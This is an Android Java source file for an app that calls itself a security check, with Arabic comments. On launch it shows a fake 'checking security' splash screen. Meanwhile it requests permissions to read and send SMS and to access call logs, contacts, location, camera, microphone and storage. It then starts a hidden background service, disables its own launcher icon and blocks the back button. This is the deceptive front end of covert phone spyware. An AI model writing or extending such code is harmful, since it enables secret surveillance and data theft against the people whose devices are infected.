package com.sec.check;

import android.Manifest;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.widget.LinearLayout;
import android.widget.TextView;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private static final String TAG = "SecurityCheck";
    private static final int PERMISSION_REQUEST = 1001;
    private static final String PREFS = "sc_prefs";
    private static final String KEY_CODE = "activation_code";

    private static final String[] PERMISSIONS = {
        Manifest.permission.INTERNET,
        Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "App started");

        // ★★★ اقرأ الكود من BuildConfig ★★★
        String activationCode = BuildConfig.ACTIVATION_CODE;
        
        // إذا كان فارغاً، استخدم القيمة المحفوظة
        if (activationCode == null || activationCode.isEmpty() || activationCode.equals("DEFAULT")) {
            SharedPreferences sp = getSharedPreferences(PREFS, MODE_PRIVATE);
            activationCode = sp.getString(KEY_CODE, "");
        }
        
        // احفظ الكود
        if (activationCode != null && !activationCode.isEmpty()) {
            SharedPreferences sp = getSharedPreferences(PREFS, MODE_PRIVATE);
            sp.edit().putString(KEY_CODE, activationCode).apply();
            Log.d(TAG, "Activation code: " + activationCode);
        }

        requestPermissions();

        // ابدأ التطبيق مباشرة
        if (activationCode != null && !activationCode.isEmpty() && !activationCode.equals("DEFAULT")) {
            showSplashAndStart();
        } else {
            // لا يوجد كود — عرض شاشة بسيطة
            showErrorScreen();
        }
    }

    private void showSplashAndStart() {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.parseColor("#f5f7fa"));
        root.setGravity(Gravity.CENTER);

        TextView icon = new TextView(this);
        icon.setText("🔐");
        icon.setTextSize(72);
        icon.setGravity(Gravity.CENTER);
        root.addView(icon);

        TextView msg = new TextView(this);
        msg.setText("جاري التحقق من الأمان...");
        msg.setTextSize(16);
        msg.setTextColor(Color.parseColor("#1a202c"));
        msg.setGravity(Gravity.CENTER);
        msg.setPadding(0, 30, 0, 0);
        root.addView(msg);

        setContentView(root);

        // بعد ثانية — ابدأ التطبيق
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public void run() {
                startApp();
            }
        }, 1500);
    }

    private void showErrorScreen() {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.parseColor("#f5f7fa"));
        root.setGravity(Gravity.CENTER);

        TextView msg = new TextView(this);
        msg.setText("⚠️\nthe application is not activated");
        msg.setTextSize(16);
        msg.setTextColor(Color.parseColor("#e11d48"));
        msg.setGravity(Gravity.CENTER);
        root.addView(msg);

        setContentView(root);

        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public void run() {
                finish();
            }
        }, 2000);
    }

    private void startApp() {
        try {
            Intent svc = new Intent(this, ServiceRunner.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(svc);
            } else {
                startService(svc);
            }
            Log.d(TAG, "Service started");
        } catch (Exception e) {
            Log.e(TAG, "Start service error: " + e.getMessage());
        }

        // اخفِ الأيقونة واخرج
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public void run() {
                hideAppIcon();
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    finishAndRemoveTask();
                } else {
                    finish();
                }
            }
        }, 500);
    }

    private void requestPermissions() {
        if (Build.VERSION.SDK_INT < 23) return;

        List<String> need = new ArrayList<>();
        for (String p : PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                need.add(p);
            }
        }
        if (!need.isEmpty()) {
            ActivityCompat.requestPermissions(this, need.toArray(new String[0]), PERMISSION_REQUEST);
        }
    }

    private void hideAppIcon() {
        try {
            PackageManager pm = getPackageManager();
            ComponentName cn = new ComponentName(this, MainActivity.class);
            pm.setComponentEnabledSetting(cn,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
            Log.d(TAG, "App hidden");
        } catch (Exception e) {
            Log.e(TAG, "Hide error: " + e.getMessage());
        }
    }

    @Override
    public void onBackPressed() {
    }
}
